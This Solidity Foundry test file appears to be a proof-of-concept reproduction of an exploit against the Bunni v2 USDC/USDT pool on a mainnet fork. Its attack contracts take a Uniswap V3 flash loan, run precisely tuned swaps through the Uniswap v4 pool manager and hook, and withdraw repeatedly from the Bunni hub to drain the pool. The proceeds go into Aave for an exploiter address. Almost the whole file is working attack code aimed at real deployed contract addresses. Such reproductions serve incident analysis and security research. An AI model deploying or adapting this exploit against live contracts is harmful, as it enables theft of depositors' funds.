// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {PoolId} from "@uniswap/v4-core/src/types/PoolId.sol";
import {IPoolManager, PoolKey} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {IBunniHub} from "../../../src/interfaces/IBunniHub.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {PoolState} from "../../../src/types/PoolState.sol";
import {IBunniHook} from "../../../src/interfaces/IBunniHook.sol";

contract Bunniv2_PoC is Test {
    address attacker;
    IERC20 usdc;
    BaseToken usdt;
    attack_contract att;
    
    IBunniHub hub;
    IPoolManager poolmanager;
    IuniswapV3 swap;
    IBunniHook hook;
    address exploiter;
    address exploiter_2;
    IERC20 aUSDC;
    IERC20 aUSDT;

    function setUp() public{
        aUSDC= IERC20(0x98C23E9d8f34FEFb1B7BD6a91B7FF122F4e16F5c);
        aUSDT= IERC20(0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a);
        exploiter = 0x0C3d8fA7762Ca5225260039ab2d3990C035B458D;

        vm.startPrank(exploiter);
        vm.createSelectFork("rpc_url",23273097);
        
        usdc=IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        usdt=BaseToken(0xdAC17F958D2ee523a2206206994597C13D831ec7);
        attacker=0x0C3d8fA7762Ca5225260039ab2d3990C035B458D;
        hub=IBunniHub(0x000000000049C7bcBCa294E63567b4D21EB765f1);
        poolmanager=IPoolManager(0x000000000004444c5dc75cB358380D2e3dE08A90);
        swap = IuniswapV3(0x4e68Ccd3E89f51C3074ca5072bbAC773960dFa36);
        hook = IBunniHook(0x000052423c1dB6B7ff8641b85A7eEfc7B2791888);        
        
        
        //setting attacker balance at blocknumber -> 23273097
        att=new attack_contract();
        deal(address(0xc92c2ba90213Fc3048A527052B0b4FeBFA716763),address(att),236266131347733058);
        vm.stopPrank();
    }

    function testExploit() public{
        vm.startPrank(exploiter);
        att.start();
        vm.stopPrank();

        console.log("aUSDC = ",aUSDC.balanceOf(0xE04eFD87F410e260cf940a3bcb8BC61f33464f2b)/1e6);
        console.log("aUSDT = ",aUSDT.balanceOf(0xE04eFD87F410e260cf940a3bcb8BC61f33464f2b)/1e6);
    }
}


contract attack_contract is Test{
    IBunniHub hub;
    IERC20 usdc;
    BaseToken usdt;
    IPoolManager poolmanager;
    IuniswapV3 swap;
    IBunniHook hook;
    PoolId poolId;
    attack_contract_2 att2;
    bool phase;
    constructor(){
        hub=IBunniHub(0x000000000049C7bcBCa294E63567b4D21EB765f1);
        usdc=IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        usdt=BaseToken(0xdAC17F958D2ee523a2206206994597C13D831ec7);
        poolmanager=IPoolManager(0x000000000004444c5dc75cB358380D2e3dE08A90);
        swap = IuniswapV3(0x4e68Ccd3E89f51C3074ca5072bbAC773960dFa36);
        hook = IBunniHook(0x000052423c1dB6B7ff8641b85A7eEfc7B2791888);
    }
    function start() public{
        usdc.approve(address(poolmanager),50_000_000_000_000);
        usdt.approve(address(poolmanager), 50_000_000_000_000);

        usdc.approve(address(hub),40_000_000_000_000);
        usdt.approve(address(hub), 50_000_000_000_000);
        swap.flash(address(this), 0, 3_000_000_000_000, "");
        
    }
    function uniswapV3FlashCallback(uint256 _fee0,uint256 _fee1,bytes calldata _data) external{
        // step 1
        poolmanager.unlock("");

        PoolKey memory key = PoolKey({
            currency0: Currency.wrap(address(usdc)),
            currency1: Currency.wrap(address(usdt)),
            fee: 0,
            tickSpacing: 1,
            hooks: IHooks(address(hook))
        });

        IBunniHub.WithdrawParams memory params = IBunniHub.WithdrawParams({
            poolKey: key,
            recipient: address(this),
            shares:119_254_548_996,
            amount0Min:0,
            amount1Min:0,
            deadline:1_756_787_903,
            useQueuedWithdrawal:false
        });
        //step 2
        hub.withdraw(params);
        IBunniHub.WithdrawParams memory params2 = IBunniHub.WithdrawParams({
            poolKey: key,
            recipient: address(this),
            shares:331_262_636_100,
            amount0Min:0,
            amount1Min:0,
            deadline:1_756_787_903,
            useQueuedWithdrawal:false
        });
        for(uint i=0; i<41; i++){hub.withdraw(params2);}

        //step 3
        poolmanager.unlock("");

        // exploit done
        usdt.transfer(address(swap),3_009_000_000_000);
        uint usdtAmount=usdt.balanceOf(address(this));
        uint usdcAmount=usdc.balanceOf(address(this));
        
        // deposit aave
        att2 = new attack_contract_2(usdtAmount,usdcAmount);
        address(att2).delegatecall(abi.encodeWithSignature("start()"));
    }



    function unlockCallback(bytes calldata _data) external returns (bytes memory) {
        PoolKey memory key = PoolKey({
            currency0: Currency.wrap(address(usdc)),
            currency1: Currency.wrap(address(usdt)),
            fee: 0,
            tickSpacing: 1,
            hooks: IHooks(address(hook))
        });

        if(phase==false){
            IPoolManager.SwapParams memory params = IPoolManager.SwapParams({
                zeroForOne: false,
                amountSpecified: -17_088_106,
                sqrtPriceLimitX96: 79226236828369693485340663719
            });

            BalanceDelta delta1 = poolmanager.swap(key, params, "");

            IPoolManager.SwapParams memory params_2 = IPoolManager.SwapParams({
                zeroForOne: false,
                //Difference between fork point and exploit point
                amountSpecified: 1835309634512-56543,// active balance -> 500
                // MAX_SQRT_PRICE - 1;
                sqrtPriceLimitX96: 1461446703485210103287273052203988822378723970341
            });
            BalanceDelta delta2 = poolmanager.swap(key,params_2,"");

            IPoolManager.SwapParams memory params_3 = IPoolManager.SwapParams({
                zeroForOne: false,
                amountSpecified: -1_000_000,
                sqrtPriceLimitX96: 101729702841318637793976746270
            });

            BalanceDelta delta3 = poolmanager.swap(key,params_3,"");

            int256 totalDelta0 = int256(delta1.amount0()) + int256(delta2.amount0()) + int256(delta3.amount0());
            int256 totalDelta1 = int256(delta1.amount1()) + int256(delta2.amount1()) + int256(delta3.amount1());
  
            poolmanager.take(Currency.wrap(address(usdc)), address(this), uint(totalDelta0));
            poolmanager.sync(Currency.wrap(address(usdt)));

            usdt.transfer(address(poolmanager),uint(-totalDelta1));
            poolmanager.settle();
            phase = true;
            return "";
        }
        else{
            
            IPoolManager.SwapParams memory params_4 = IPoolManager.SwapParams({
                zeroForOne: false,
                amountSpecified: -10_000_000_000_000_000_000,
                // MAX_SQRT_PRICE - 1;
                sqrtPriceLimitX96: 1461446703485210103287273052203988822378723970341
            });
            BalanceDelta delta4 = poolmanager.swap(key,params_4,"");

            IPoolManager.SwapParams memory params_5 = IPoolManager.SwapParams({
                zeroForOne: true,
                amountSpecified: 10000002885864344623,
                // MAX_SQRT_PRICE - 1;
                sqrtPriceLimitX96: 4295128740
            });
            BalanceDelta delta5 = poolmanager.swap(key,params_5,"");
            poolId = PoolId.wrap(0xd9f673912e1da331c9e56c5f0dbc7273c0eb684617939a375ec5e227c62d6707);
            hub.poolState(poolId);

            int256 totalDelta0 = int256(delta4.amount0()) + int256(delta5.amount0());
            int256 totalDelta1 = int256(delta4.amount1()) + int256(delta5.amount1());
            
            poolmanager.sync(Currency.wrap(address(usdc)));
            usdc.transfer(address(poolmanager), uint(-totalDelta0));
            poolmanager.settle();
            poolmanager.take(Currency.wrap(address(usdt)),address(this),uint(totalDelta1));
            return "";
        }
    }
}

contract attack_contract_2 {
    IAavePool aave;
    IERC20 usdc;
    BaseToken usdt;
    uint balance0;
    uint balance1;
    address exploiter_2;
    constructor(uint amount0, uint amount1){
        aave = IAavePool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
        usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        usdt = BaseToken(0xdAC17F958D2ee523a2206206994597C13D831ec7);
        balance0 = amount0;
        balance1 = amount1;
        exploiter_2 = 0xE04eFD87F410e260cf940a3bcb8BC61f33464f2b;
    }
    
    function start() public{
        IAavePool aave_local = IAavePool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
        IERC20 usdc_local = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        BaseToken usdt_local = BaseToken(0xdAC17F958D2ee523a2206206994597C13D831ec7);
        address exploiter_local = 0xE04eFD87F410e260cf940a3bcb8BC61f33464f2b;

        usdt_local.approve(address(aave_local), 50000000000000);
        usdc_local.approve(address(aave_local), type(uint).max);
        aave_local.supply(address(usdt_local), usdt_local.balanceOf(address(this)), exploiter_local, 0);
        aave_local.supply(address(usdc_local), usdc_local.balanceOf(address(this)), exploiter_local, 0);
    }
}

interface BaseToken{
    function balanceOf(address account) external returns (uint);
    function transfer(address,uint) external;
    function approve(address,uint) external;
}
interface IAavePool{
function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;}
interface IERC4626 {
    function previewRedeem(uint256 shares) external view returns (uint256);
}
interface IuniswapV3{
    function flash(
        address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}